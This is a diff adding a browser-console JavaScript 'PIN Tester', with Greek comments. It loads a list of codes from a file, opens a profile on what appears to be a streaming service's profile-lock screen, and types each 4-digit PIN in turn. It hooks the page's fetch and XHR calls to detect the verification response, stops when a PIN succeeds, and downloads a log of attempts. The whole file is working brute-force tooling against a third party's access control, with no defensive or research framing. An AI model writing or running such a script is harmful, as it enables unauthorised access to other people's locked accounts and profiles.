@@ -1,0 +1,204 @@
+// === PIN Tester (multi-input, React-safe, waits XHR or DOM/URL) + File loader ===
+
+// ---- CONFIG (άλλαξε μόνο αν χρειάζεται) ----
+const PRE_CLICK_SEL = "#appMountPoint > div > div > div > div > div:nth-child(2) > div.bd.dark-background > div.profiles-gate-container > div > div > ul > li:nth-child(4) > div > a > div > div";
+const INPUT_CONTAINER_SEL = "#appMountPoint > div > div > div > div > div:nth-child(2) > div.bd.dark-background > div.profiles-gate-container > div > div.profile-pin-prompt-pad-wrapper > div";
+const INPUT_SEL = "input.pin-number-input"; // 4 inputs
+const RATE_MS = 1000;
+const TIMEOUT_MS = 12000;
+const DIGIT_DELAY_MS = 120;
+const SETTLE_MS = 300;
+const STOP_ON_SUCCESS = true;
+
+// Request matchers (χαλαρά — σφίξε αν ξέρεις ακριβές path/body)
+const VERIFY_URL_REGEX = /profilelock|profile|pin|verify|mre/i;
+const VERIFY_BODY_MATCH = /"action"\s*:\s*"verify"|pin/i;
+
+// ---- Helpers ----
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+const nowIso = () => new Date().toISOString();
+const textOf = el => (el ? (el.innerText || el.textContent || "").trim() : "");
+
+// Loader για txt -> CODES
+async function loadCodesFromFile() {
+  return new Promise((resolve) => {
+    const input = Object.assign(document.createElement('input'), {type:'file',accept:'.txt'});
+    input.onchange = (e) => {
+      const file = e.target.files[0];
+      const reader = new FileReader();
+      reader.onload = (evt) => {
+        const lines = String(evt.target.result).split(/\r?\n/).map(l=>l.trim()).filter(Boolean);
+        resolve(lines);
+      };
+      reader.readAsText(file);
+    };
+    input.click();
+  });
+}
+
+// React-safe setter
+const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
+  window.HTMLInputElement.prototype, 'value'
+).set;
+function setNativeValue(el, val) {
+  nativeInputValueSetter.call(el, val);
+  el.dispatchEvent(new Event('input', { bubbles: true }));
+}
+
+// Network interceptors
+(function installInterceptors(){
+  if (window.__pinNwInstalled) return; window.__pinNwInstalled = true;
+  const listeners = new Set();
+  const notify = (evt)=>listeners.forEach(fn=>{try{fn(evt)}catch{}});
+  window.__waitVerify = (timeoutMs=12000)=> new Promise((res,rej)=>{
+    const fn = (evt)=>{
+      if (!evt || evt.method!=='POST') return;
+      if (!VERIFY_URL_REGEX.test(evt.url)) return;
+      const bodyStr = typeof evt.body==='string' ? evt.body : JSON.stringify(evt.body||"");
+      if (!VERIFY_BODY_MATCH.test(bodyStr)) return;
+      cleanup(); res(evt);
+    };
+    listeners.add(fn);
+    const to = setTimeout(()=>{ cleanup(); rej(new Error('Timeout verify response')); }, timeoutMs);
+    function cleanup(){ listeners.delete(fn); clearTimeout(to); }
+  });
+  // fetch
+  const _fetch = window.fetch;
+  window.fetch = async function(...args){
+    const url = String(args[0]); const opts = args[1]||{};
+    const method = (opts.method||'GET').toUpperCase();
+    let body = opts.body; if (typeof body==='string'){ try{ body=JSON.parse(body); }catch{} }
+    const resp = await _fetch.apply(this,args);
+    const clone = resp.clone(); let txt=""; try{ txt=await clone.text(); }catch{}
+    let json=null; try{ json=JSON.parse(txt); }catch{}
+    notify({transport:'fetch', url, method, status: resp.status, body, respText: txt, json});
+    return resp;
+  };
+  // XHR
+  const _open = XMLHttpRequest.prototype.open;
+  const _send = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open = function(m,u,...rest){ this.__m=(m||'GET').toUpperCase(); this.__u=String(u); return _open.call(this,m,u,...rest); };
+  XMLHttpRequest.prototype.send = function(b){ this.__b=b; this.addEventListener('loadend',()=>{
+      let txt=""; try{ txt=this.responseText||""; }catch{} let json=null; try{ json=JSON.parse(txt); }catch{}
+      let body=this.__b; if (typeof body==='string'){ try{ body=JSON.parse(body); }catch{} }
+      notify({transport:'xhr', url:this.__u, method:this.__m, status:this.status, body, respText:txt, json});
+    }); return _send.call(this,b);
+  };
+})();
+
+function clickIfVisible(sel){
+  const el = document.querySelector(sel); if(!el) return false;
+  const r = el.getBoundingClientRect(); if(r.width<=0||r.height<=0) return false;
+  el.scrollIntoView({block:'center'}); el.click(); return true;
+}
+
+async function ensureInputs(){
+  const deadline = performance.now()+TIMEOUT_MS;
+  let cont = document.querySelector(INPUT_CONTAINER_SEL);
+  while(!cont && performance.now()<deadline){ await sleep(50); cont=document.querySelector(INPUT_CONTAINER_SEL); }
+  if(!cont) throw new Error('Δεν βρέθηκε container PIN');
+  let inputs = Array.from(cont.querySelectorAll(INPUT_SEL));
+  if(inputs.length<4){ inputs = Array.from(document.querySelectorAll(INPUT_SEL)); }
+  const t0 = performance.now();
+  while(inputs.length<4 && performance.now()-t0<2000){ await sleep(50); inputs = Array.from(document.querySelectorAll(INPUT_SEL)); }
+  if(inputs.length<4) throw new Error('Δεν βρέθηκαν 4 inputs');
+  return inputs;
+}
+
+async function typePinReactStyle(inputs, pin){
+  const s = String(pin).padStart(4,'0').slice(0,4);
+  for(const inp of inputs){ inp.focus(); setNativeValue(inp,''); }
+  for(let i=0;i<4;i++){
+    const ch = s[i]; const inp = inputs[i];
+    inp.focus();
+    try{ inp.setSelectionRange(0,0); }catch{}
+    inp.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,key:ch}));
+    setNativeValue(inp, ch);
+    inp.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,key:ch}));
+    await sleep(DIGIT_DELAY_MS);
+  }
+  inputs[3].blur();
+  inputs[3].dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,key:'Enter'}));
+  inputs[3].dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,key:'Enter'}));
+  await sleep(SETTLE_MS);
+}
+
+async function waitDomOrUrlChange(beforeText, beforeURL){
+  const deadline = performance.now()+TIMEOUT_MS;
+  while(performance.now()<deadline){
+    const bodyText = (document.body.innerText||"").trim();
+    const url = location.href;
+    if (bodyText!==beforeText || url!==beforeURL) return {bodyText, url};
+    await sleep(120);
+  }
+  throw new Error('Timeout DOM/URL change');
+}
+
+// ---- Main (όλα μαζί) ----
+(async()=>{
+  // 1) Διάλεξε codes.txt
+  const CODES = await loadCodesFromFile();
+  console.log("🔢 Φορτώθηκαν κωδικοί:", CODES.length);
+  if (!CODES.length) { console.warn("Κενό αρχείο."); return; }
+
+  // 2) Αρχικό click (π.χ. επιλογή προφίλ)
+  if (PRE_CLICK_SEL) {
+    if (!clickIfVisible(PRE_CLICK_SEL)) {
+      const el=document.querySelector(PRE_CLICK_SEL); if(el){ el.scrollIntoView({block:'center'}); el.click(); }
+    }
+    await sleep(250);
+  }
+
+  console.log('🚀 Ξεκίνησε ο tester… συνολικά codes:', CODES.length);
+  const logs = [];
+
+  for (let i=0;i<CODES.length;i++){
+    const code = String(CODES[i]).trim();
+    if (!code) continue;
+    const attempt = i+1;
+    const pinMasked = code.slice(0,2)+'**';
+    const beforeText = (document.body.innerText||"").trim();
+    const beforeURL = location.href;
+    const t0 = performance.now();
+
+    try{
+      const inputs = await ensureInputs();
+      const waitVerify = window.__waitVerify(TIMEOUT_MS).catch(e=>({__err:e}));
+      await typePinReactStyle(inputs, code);
+      const waitDom = waitDomOrUrlChange(beforeText, beforeURL).catch(e=>({__err:e}));
+
+      const winner = await Promise.race([waitVerify, waitDom]);
+      const elapsed = Math.round(performance.now()-t0);
+
+      let success=false, locked=false, status=null, result_snippet="";
+      if (winner && !winner.__err && winner.transport){
+        status = winner.status;
+        result_snippet = (winner.respText||"").slice(0,400);
+        const data = winner.json||{};
+        success = data.success===true;
+        locked = data.isLocked===true;
+      } else if (winner && !winner.__err){
+        result_snippet = (winner.bodyText||"").slice(0,400);
+        success = (winner.url!==beforeURL);
+      } else {
+        throw (winner && winner.__err) || new Error('Άγνωστο σφάλμα αναμονής');
+      }
+
+      logs.push({ts:nowIso(), attempt, pin_masked:pinMasked, status, success, locked, latency_ms:elapsed, result_snippet});
+      console.log(`[${attempt}] pin=${code} success=${success} locked=${locked} status=${status??'-'} latency=${elapsed}ms`);
+
+      if (success && STOP_ON_SUCCESS) { console.warn(`✅ Success! PIN: ${code}`); break; }
+    } catch(err){
+      logs.push({ts:nowIso(), attempt, pin_masked:pinMasked, error:String(err?.message||err)});
+      console.error(`[${attempt}] pin=${code} ✖ Σφάλμα:`, err);
+    }
+    await sleep(RATE_MS);
+  }
+
+  // 3) Κατέβασμα logs.jsonl
+  const blob = new Blob([logs.map(o=>JSON.stringify(o)).join("\n")], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = Object.assign(document.createElement('a'), {href:url, download:'logs.jsonl'});
+  document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+  console.log('✅ Τέλος. Κατέβηκαν τα logs.jsonl');
+})();
